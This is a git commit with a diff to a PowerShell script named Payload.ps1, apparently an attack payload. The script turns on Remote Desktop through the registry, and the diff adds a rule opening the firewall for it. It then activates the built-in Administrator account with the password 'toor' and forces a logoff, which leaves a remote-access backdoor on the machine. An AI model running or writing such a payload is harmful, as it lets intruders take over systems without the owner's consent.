04a6ffe6eced6a292b335ec0053001cfe8e77a10
TheDarkNyx <RoyPaz@OutLook.com>
2017-09-08 14:04:21 +0300

    Update Payload.ps1

--- Payload.ps1
+++ Payload.ps1
@@ -1,4 +1,5 @@
 sleep(5)
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
 cmd /c "net user Administrator toor /active:yes"
 shutdown -l -f
